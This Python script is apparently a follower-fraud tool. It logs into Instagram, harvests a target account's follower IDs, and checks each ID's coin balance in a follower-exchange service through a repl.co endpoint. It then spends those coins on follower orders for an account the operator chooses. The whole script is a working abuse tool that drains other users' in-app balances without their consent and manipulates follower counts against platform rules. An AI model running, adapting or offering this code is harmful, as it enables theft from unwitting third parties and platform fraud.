import requests, instaloader ,os
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
os.system('clear')
L = instaloader.Instaloader()
username=input('[+] Login UserName ==> ')
password=input('[+] Login PassWord ==> ')
sendtoo=input('[+] UserName To Send Followers ==> ')
L = instaloader.Instaloader()
profile = str(instaloader.Profile.from_username(L.context,sendtoo))
idd=str(profile.split(')>')[0])
sendto=idd.split(' (')[1]
getuser=input('[+] UserName To Get Followers ==> ')
L.login(username,password)
profile = instaloader.Profile.from_username(L.context, getuser)
follow_list = []
count=0
for followee in profile.get_followers():
 user=str(followee)
 idd=user.split('(')[1]
 id=idd.split(')')[0]
 follow_list.append(id)
 count=count+1
 url=f'https://coin1.whisper666.repl.co/?oid={id}&submit=submit'
 whisper=str(requests.get(url).text)
 if 'coins":"' in whisper:
  coin=str(whisper.split('coins":"')[1])
  coins=str(coin.split('"')[0])
  print(f'{B}[♤] {id} Coins Is ==> {coins}')
  coinp = int(coins)
  orde = (coinp/4)
  ord3 = str(orde)
  fol = ord3.split('.')[0]
  url=f'https://instaup-v6.techdz1.repl.co/?oid={id}&uid={sendto}&hadi={fol}&submit=submit'
  whisper=requests.get(url).text
  if '"status":"Error","message":"To set an order, you must have more than 50 coins."' in whisper:
   print(E+"[❌] Less Coins")
  if "You don't have enough coins!" in whisper:
   print(E+"[❌] Less Coins")
  if 'Sending orders less than 150 is temporarily disabled. Please try again in another hour.' in whisper:
   print(E+"[❌] Less Coins")
  if '"status":"Error","message":"Your accound suspended due to unfollowing. If you think there is a mistake, call us at instaup.developers@gmail.com."' in whisper:
   print(E+"[🚫] Blocked User")
  if '"status":"Error","message":"There is a problem registering the order. Contact support"' in whisper:
   print(E+"[🙁] Order Error")
  if 'Successful' in whisper:
   print(G+f'[✅]Successful Send {fol} Follower To ==> {sendtoo}')
  if 'You have to wait until the previous order is completed.' in whisper:
   print(E+"[×] Wait")
  else:
   pass
 else:
  print(f'{E}[{count}] {id} Error')